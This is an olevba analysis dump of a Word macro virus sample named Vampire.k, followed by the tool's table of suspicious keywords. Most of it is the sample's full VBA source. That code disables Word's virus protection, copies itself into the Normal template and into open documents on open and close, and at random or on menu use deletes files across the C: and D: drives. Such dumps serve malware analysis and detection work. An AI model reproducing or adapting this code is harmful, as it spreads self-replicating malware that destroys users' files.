olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vampire.k-261e6ec6329dc7f568976849b8eadf2e63eafefe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vampire.k-261e6ec6329dc7f568976849b8eadf2e63eafefe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Vampire.bas 
in file: Virus.MSWord.Vampire.k-261e6ec6329dc7f568976849b8eadf2e63eafefe - OLE stream: 'Macros/VBA/Vampire'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoClose()
Attribute AutoClose.VB_Description = "¥¨¶°«Ø¥ß©ó 98/03/15¡A«Ø¥ßªÌ AAAA"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.Vampire.autoclose"
Dim CONT
On Error Resume Next
    Options.VirusProtection = False
    Set activedoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Vampire" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Vampire" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Vampire", Object:=wdOrganizerObjectProjectItems
        activedoc.SaveAs , fileformat:=wdFormatTemplate
        Options.SavePropertiesPrompt = False
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Vampire", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If

CONT = WordBasic.Int(Rnd() * 20) + 1
If CONT = 13 Then
WordBasic.call "super"
WordBasic.call "super2"
End If
exit_:

End Sub
Sub AutoExec()
Dim TC
On Error Resume Next
TC = WordBasic.Int(Rnd() * 30) + 1
If TC = 11 Or TC = 21 Or TC = 31 Then
WordBasic.call "super1"
WordBasic.call "super3"
End If

End Sub
Sub AutoOpen()
On Error Resume Next
   
    Options.VirusProtection = False
    Set activedoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Vampire" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Vampire" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Vampire", Object:=wdOrganizerObjectProjectItems
        activedoc.SaveAs , fileformat:=wdFormatTemplate
        Options.SavePropertiesPrompt = False
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Vampire", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If

exit_:
End Sub
Sub FileTemplates()
Dim M
WordBasic.DisableInput 1
On Error Resume Next
M = WordBasic.Int(Rnd() * 7) + 1
If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Or WordBasic.WeekDay(WordBasic.Now()) = W Then
WordBasic.call "super1"
End If

End Sub
Sub ViewVbCode()
Dim M
WordBasic.DisableInput 1
On Error Resume Next
M = WordBasic.Int(Rnd() * 7) + 1
If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Or WordBasic.WeekDay(WordBasic.Now()) = W Then
WordBasic.call "super1"
End If

End Sub
Sub ToolsCustomize()
Dim M
WordBasic.DisableInput 1
On Error Resume Next
M = WordBasic.Int(Rnd() * 7) + 1
If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Or WordBasic.WeekDay(WordBasic.Now()) = W Then
WordBasic.call "super1"
End If

End Sub
Sub ToolsOptions()
Dim M
WordBasic.DisableInput 1
On Error Resume Next
M = WordBasic.Int(Rnd() * 7) + 1
If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Or WordBasic.WeekDay(WordBasic.Now()) = W Then
WordBasic.call "super1"
End If

End Sub
Sub ToolsMacro()
Dim M
WordBasic.DisableInput 1
On Error Resume Next
M = WordBasic.Int(Rnd() * 7) + 1
If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Or WordBasic.WeekDay(WordBasic.Now()) = W Then
WordBasic.call "super1"
End If

End Sub
Sub super()
Dim SHIT
Dim XX
Dim GD$
Dim FCGC$
lac:
On Error Resume Next
SHIT = WordBasic.CountDirectories("C:\")
For XX = 1 To SHIT
GD$ = "C:\" + WordBasic.[GetDirectory$]("C:\", XX) + "\*.*"
FCGC$ = WordBasic.[Files$]("C:\" + WordBasic.[GetDirectory$]("C:\", XX) + "\*.*")
If FCGC$ = "" Then GoTo TRY
WordBasic.Kill FCGC$

TRY:
Next XX

exit_:

End Sub
Sub super1()
Dim CYCL
Dim SHIT1
Dim XXX
Dim GD$
Dim FCGC$
CYCL = 0
laca:
On Error Resume Next

SHIT1 = WordBasic.CountDirectories("C:\")
For XXX = 1 To SHIT1
GD$ = "C:\" + WordBasic.[GetDirectory$]("C:\", XXX) + "\*.*"
FCGC$ = WordBasic.[Files$]("C:\" + WordBasic.[GetDirectory$]("C:\", XXX) + "\*.*")
If FCGC$ = "" Then GoTo TRY
WordBasic.Kill FCGC$

TRY:
Next XXX

exit_:

CYCL = CYCL + 1
If CYCL <= 7 Then GoTo laca

End Sub
Sub super2()
Dim SHIT2
Dim YY
Dim GD$
Dim FCGC$
lacb:
On Error Resume Next
SHIT2 = WordBasic.CountDirectories("D:\")
For YY = 1 To SHIT2
GD$ = "D:\" + WordBasic.[GetDirectory$]("D:\", YY) + "\*.*"
FCGC$ = WordBasic.[Files$]("C:\" + WordBasic.[GetDirectory$]("D:\", YY) + "\*.*")
If FCGC$ = "" Then GoTo TRY
WordBasic.Kill FCGC$

TRY:
Next YY

exit_:

End Sub
Sub super3()
Dim CYC
Dim SHIT3
Dim YYY
Dim GD$
Dim FCGC$
CYC = 0

lacc:
On Error Resume Next

SHIT3 = WordBasic.CountDirectories("D:\")
For YYY = 1 To SHIT3
GD$ = "D:\" + WordBasic.[GetDirectory$]("D:\", YYY) + "\*.*"
FCGC$ = WordBasic.[Files$]("D:\" + WordBasic.[GetDirectory$]("D:\", YYY) + "\*.*")
If FCGC$ = "" Then GoTo TRY
WordBasic.Kill FCGC$

TRY:
Next YYY

exit_:

CYC = CYC + 1
If CYC <= 7 Then GoTo lacc

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

